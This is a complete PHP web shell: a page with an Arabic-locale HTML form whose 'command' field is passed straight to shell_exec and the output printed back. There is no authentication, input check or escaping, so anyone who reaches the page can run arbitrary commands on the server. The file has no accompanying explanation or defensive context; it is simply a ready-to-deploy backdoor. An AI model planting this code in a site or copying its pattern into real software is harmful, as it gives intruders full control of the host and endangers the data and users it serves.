<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_POST["command"])) {
    $command = $_POST["command"]; 
    $output = shell_exec($command);
}
?>

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome ***********</title>
</head>
<body>
    <h2>Enter the command to run:</h2>
    <form method="post">
        <input type="text" name="command" required>
        <button type="submit">Run</button>
    </form>

    <?php if (!empty($output)): ?>
        <h3>result : </h3>
        <pre><?php echo $output ?></pre>
    <?php endif; ?>
</body>
</html>
